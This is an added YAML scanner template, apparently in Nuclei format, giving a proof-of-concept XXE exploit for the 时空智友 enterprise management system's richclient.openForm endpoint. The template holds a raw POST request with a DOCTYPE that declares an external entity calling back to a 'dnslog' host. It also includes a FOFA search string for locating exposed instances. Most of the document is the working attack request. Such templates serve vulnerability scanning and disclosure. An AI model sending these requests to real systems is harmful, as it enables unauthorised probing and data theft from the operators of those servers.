@@ -1,0 +1,38 @@
+id: poc-fev8nfpuycgg29il
+info:
+  name: 时空智友企业信息管理系统 richclient.openForm 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fev8nfpuycgg29il'
+  tags: xxe,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fev8nfpuycgg29il
+    fofa: body="时空智友"
+http:
+- raw:
+  - 'POST /formservice?service=richclient.openForm HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (MHhzZWNs Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/Xml
+
+
+    <?xml version="1.0" encoding="UTF-8" ?>
+
+    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://dnslog">]>
+
+    <xxx>&xxe;</xxx>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
